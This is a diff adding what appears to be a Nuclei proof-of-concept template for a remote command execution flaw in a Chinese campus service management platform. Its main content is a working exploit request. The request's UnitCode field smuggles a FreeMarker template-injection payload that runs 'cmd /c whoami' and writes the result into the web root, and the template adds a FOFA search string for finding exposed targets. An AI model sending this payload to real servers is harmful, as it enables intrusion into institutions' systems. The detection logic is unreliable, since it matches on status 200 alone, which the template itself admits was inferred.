@@ -1,0 +1,21 @@
+id: poc-7fa809c339022f3d3cf0
+info:
+  name: 新开普掌上校园服务管理平台service.action存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7fa809c339022f3d3cf00fc2256d492f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7fa809c339022f3d3cf00fc2256d492f
+    fofa: + fofa`title="掌上校园服务管理平台"`
+http:
+- raw:
+  - "POST /service_transport/service.action HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nCookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\n\n{\n        \"command\": \"GetFZinfo\",\n        \"UnitCode\": \"<#assign ex = \\\"freemarker.template.utility.Execute\\\"\n        ?new()>${ex(\\\"cmd /c whoami >./webapps/ROOT/1.txt\\\")}\"\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
